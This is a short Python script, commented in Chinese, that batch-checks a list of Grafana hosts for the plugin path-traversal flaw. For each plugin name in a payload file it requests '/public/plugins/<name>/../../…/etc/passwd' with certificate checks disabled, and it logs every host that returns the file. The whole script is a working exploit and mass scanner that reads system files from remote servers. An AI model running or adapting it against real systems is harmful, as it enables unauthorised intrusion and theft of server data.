#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# Grafana plugins 任意文件读取批量检测

import requests
import urllib3
urllib3.disable_warnings()

def poc(host):
    pyload = open('pyload.txt')
    print('正在测试目标:',host)
    for pd in pyload:
        url = host + "/public/plugins/" + str.rstrip(pd) + "/../../../../../../../../../../../etc/passwd"
        headers = {
            "User-Agent":"Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = requests.get(url=url, headers=headers,timeout=(3,10),verify=False)

        if response.status_code == 200 and 'root:' in response.text:
            print('[+]' + str.rstrip(pd) + '-----' + '该路径存在漏洞!')
            with open('vuln.txt', 'a+') as f:
                f.write(url + '\n')
        else:
            print(str.rstrip(pd) + '-----' + '该路径无效！')

if __name__ == "__main__":
    for host in open(r'urls.txt'):
        host = host.strip()
        poc(host)

